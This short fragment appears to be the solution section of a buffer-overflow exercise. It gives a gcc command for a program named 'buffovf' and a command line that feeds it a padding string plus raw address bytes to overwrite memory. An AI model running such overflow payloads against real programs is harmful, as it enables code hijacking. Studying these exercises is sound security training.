## Solution

### Exploit
```
gcc -o buffovf buffovf.c
./buffovf `echo -ne "AAAAAAAABBBBBBCCCCCCCCDDDDDDDDEEEEEEEE\x38\x10\x60"` `echo -ne "\x80\x06\x40"`
```
